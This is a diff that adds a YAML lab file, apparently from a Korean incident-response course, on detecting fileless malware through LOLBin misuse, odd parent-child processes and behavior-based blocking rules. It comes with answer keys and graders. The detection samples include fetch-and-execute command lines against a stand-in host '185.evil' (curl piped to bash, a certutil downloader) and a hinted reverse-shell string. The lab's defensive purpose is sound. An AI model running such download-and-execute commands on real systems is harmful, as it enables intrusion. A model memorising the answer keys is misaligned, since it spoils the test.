@@ -1,0 +1,174 @@
+lab_id: agent-ir-adv-week09
+title: "W09 — Fileless 악성코드: LOLBin 비정상 사용·이상 행위·행위 기반 방어"
+version: ai
+course: agent-ir-adv
+week: 9
+description: |
+  디스크 흔적 없는 악성코드를 행위로 탐지. LOLBin 비정상 사용(FILELESS_INDICATOR), 프로세스 인젝션·이상
+  부모-자식(BEHAVIOR_DETECTED), 행위 기반 방어(CONTAINED), 종합(Assessment).
+  파일 없어도 행위는 남는다 — 정상 도구의 비정상 사용을 잡는다. ⚠️ Sysmon 상당 텔레메트리 el34 미보유.
+difficulty: hard
+duration_minutes: 150
+audience: 에이전트 IR 심화 (9주차)
+prerequisites:
+  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
+  - GPU Ollama 도달 — gemma3:4b
+  - W09 강의안 정독 — §0.5(파일리스·LOLBins·행위 기반)
+objectives:
+  - "GPU 헬스체크(GEN_OK)"
+  - "LOLBin 비정상 사용 탐지(FILELESS_INDICATOR)"
+  - "프로세스 인젝션·이상 부모-자식 탐지(BEHAVIOR_DETECTED)"
+  - "행위 기반 방어(CONTAINED)"
+  - "종합(Assessment)"
+pass_threshold: 0.6
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — GPU 헬스체크 → GEN_OK
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
+      ```
+      ✅ 마지막 줄 `GEN_OK`.
+    answer: |
+      ready
+      GEN_OK
+    answer_detail: "GPU 응답 확인."
+    verify:
+      type: output_contains
+      expect: GEN_OK
+      field: stdout
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — LOLBin 비정상 사용 → FILELESS_INDICATOR
+      > **🎯 목표:** 정상 도구(curl/certutil/bash)의 비정상 사용을 탐지.
+      > **개념:** 도구는 정상; 사용 방식(원격 실행·인코딩)이 이상.
+      ```bash
+      python3 - <<'PY'
+      import re, base64
+      # 실행 명령들 (LOLBin)
+      cmds=["curl -s http://cdn.example.com/style.css",
+            "bash -c \"$(curl -s http://185.evil/x|base64 -d)\"",   # 원격 코드 파이프 실행
+            "certutil -urlcache -f http://185.evil/p.exe p.exe"]     # certutil 다운로더 악용
+      SUSPICIOUS=[re.compile(r"curl.*\|\s*(bash|sh|python)"),        # 다운로드→파이프 실행
+                  re.compile(r"base64\s+-d"),                        # 인코딩 디코드 실행
+                  re.compile(r"certutil.*-urlcache.*http")]          # certutil 다운로더
+      flagged=[c for c in cmds if any(s.search(c) for s in SUSPICIOUS)]
+      for c in cmds:
+          bad=any(s.search(c) for s in SUSPICIOUS)
+          print(f"  {'SUSPICIOUS' if bad else 'normal    '}: {c[:44]}")
+      print("FILELESS_INDICATOR" if len(flagged)>=2 else "CLEAN")
+      PY
+      ```
+      ✅ 마지막 줄 `FILELESS_INDICATOR` (curl|bash·base64 -d·certutil 다운로더 = 비정상 사용).
+      🔎 curl 자체는 정상. 하지만 원격 코드를 파이프로 바로 실행하면 파일리스 다운로더. 사용 방식이 신호.
+    answer: |
+      normal    : curl -s http://cdn.example.com/style.css
+      SUSPICIOUS: bash -c "$(curl -s http://185.evil/x|base64 -d)"
+      SUSPICIOUS: certutil -urlcache -f http://185.evil/p.exe p.exe
+      FILELESS_INDICATOR
+    answer_detail: "LOLBin(curl|bash·certutil)의 비정상 사용 탐지 → FILELESS_INDICATOR."
+    verify:
+      type: output_contains
+      expect: FILELESS_INDICATOR
+      field: stdout
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — 이상 행위 탐지 → BEHAVIOR_DETECTED
+      > **🎯 목표:** 비정상 부모-자식 프로세스로 인젝션·파일리스 실행 탐지.
+      > **개념:** 프로세스 계보가 신호 — 웹서버가 셸을 낳으면 이상.
+      ```bash
+      python3 - <<'PY'
+      # 프로세스 부모-자식 관계
+      processes=[{"parent":"systemd","child":"nginx"},          # 정상
+                 {"parent":"nginx","child":"/bin/sh"},          # 웹서버가 셸! 이상
+                 {"parent":"/bin/sh","child":"python -c 'import socket...'"}]  # 리버스셸 정황
+      # 비정상 부모-자식 규칙: 서비스 데몬이 셸/스크립트를 낳음
+      SERVICE_PARENTS={"nginx","apache2","httpd","php-fpm","mysqld"}
+      SHELLS={"/bin/sh","/bin/bash","sh","bash"}
+      anomalies=[]
+      for p in processes:
+          if p["parent"] in SERVICE_PARENTS and (p["child"] in SHELLS or "python -c" in p["child"]):
+              anomalies.append((p["parent"],p["child"]))
+      for p in processes: print(f"  {p['parent']} -> {p['child'][:30]}")
+      print("anomalous parent-child:", anomalies)
+      print("BEHAVIOR_DETECTED" if anomalies else "NORMAL")
+      PY
+      ```
+      ✅ 마지막 줄 `BEHAVIOR_DETECTED` (nginx가 /bin/sh를 낳음 = 웹셸/인젝션 정황).
+      🔎 서비스 데몬(nginx)이 셸을 낳는 건 정상 아님. 프로세스 계보로 파일리스 실행을 잡는다.
+    answer: |
+      systemd -> nginx
+      nginx -> /bin/sh
+      /bin/sh -> python -c 'import socket...
+      anomalous parent-child: [('nginx', '/bin/sh')]
+      BEHAVIOR_DETECTED
+    answer_detail: "비정상 부모-자식(nginx→셸) 탐지 → BEHAVIOR_DETECTED. 프로세스 계보가 신호."
+    verify:
+      type: output_contains
+      expect: BEHAVIOR_DETECTED
+      field: stdout
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 행위 기반 방어 → CONTAINED
+      > **🎯 목표:** LOLBin 정책·프로세스 규칙으로 파일리스 차단.
+      > **개념:** 파일 없어도 행위 규칙으로 막는다.
+      ```bash
+      python3 - <<'PY'
+      # 행위 기반 방어 규칙(EDR 상당)
+      def edr_policy(event):
+          # 1) 서비스가 셸 실행 차단
+          if event.get("parent") in {"nginx","apache2","php-fpm"} and event.get("child") in {"/bin/sh","/bin/bash"}:
+              return "BLOCK+alert (service spawning shell)"
+          # 2) LOLBin 원격 실행 차단
+          if "|" in event.get("cmd","") and "curl" in event.get("cmd","") and any(s in event.get("cmd","") for s in ["bash","sh"]):
+              return "BLOCK+alert (remote pipe exec)"
+          return "allow"
+      tests=[{"parent":"nginx","child":"/bin/sh"},
+             {"cmd":"bash -c \"$(curl http://evil|base64 -d)\""},
+             {"parent":"systemd","child":"nginx"}]
+      results=[edr_policy(t) for t in tests]
+      for t,r in zip(tests,results): print(f"  {str(t)[:40]:40} -> {r}")
+      contained = "BLOCK" in results[0] and "BLOCK" in results[1] and results[2]=="allow"
+      print("CONTAINED" if contained else "CHECK")
+      PY
+      ```
+      ✅ 마지막 줄 `CONTAINED` (서비스 셸 실행·원격 파이프 실행 차단, 정상 통과).
+      🔎 행위 규칙(서비스→셸 금지, LOLBin 원격 실행 금지)으로 파일리스를 차단. 파일 없어도 행위로 막는다.
+    answer: |
+      {'parent': 'nginx', 'child': '/bin/sh'}    -> BLOCK+alert (service spawning shell)
+      {'cmd': 'bash -c "$(curl http://evil|ba... -> BLOCK+alert (remote pipe exec)
+      {'parent': 'systemd', 'child': 'nginx'}    -> allow
+      CONTAINED
+    answer_detail: "행위 규칙으로 서비스 셸·원격 파이프 실행 차단 → CONTAINED. 파일 없어도 방어."
+    verify:
+      type: output_contains
+      expect: CONTAINED
+      field: stdout
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — 종합 → Assessment
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Write a short note for W09 on fileless malware. Findings: LOLBins used abnormally (curl piped to bash, certutil downloader) were flagged (FILELESS_INDICATOR), an abnormal parent-child (nginx spawning a shell) revealed fileless execution (BEHAVIOR_DETECTED), and behavior rules blocked service-spawned shells and remote pipe execution (CONTAINED). Explain that fileless malware leaves no disk file so file scanning fails, and defense is behavior/memory based, catching abnormal use of normal tools. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
+      ```
+      ✅ 출력에 `Assessment`.
+      🔎 정리: 파일리스는 디스크 흔적 없이 메모리·LOLBins로 동작. 행위·메모리 기반 탐지로 정상 도구의 비정상 사용을 잡는다.
+      다음 주(W10)는 **DNS Exfiltration + AI 인코딩**.
+    answer: |
+      Assessment
+      Fileless malware leaves no disk file, so file scanning fails; it runs in memory and via LOLBins (normal tools).
+      Defense is behavior/memory based: catch abnormal parent-child processes and abnormal use of normal tools.
+    answer_detail: "W09 파일리스 종합(Assessment). LOLBin·행위 기반 탐지."
+    verify:
+      type: output_contains
+      expect: Assessment
+      field: stdout
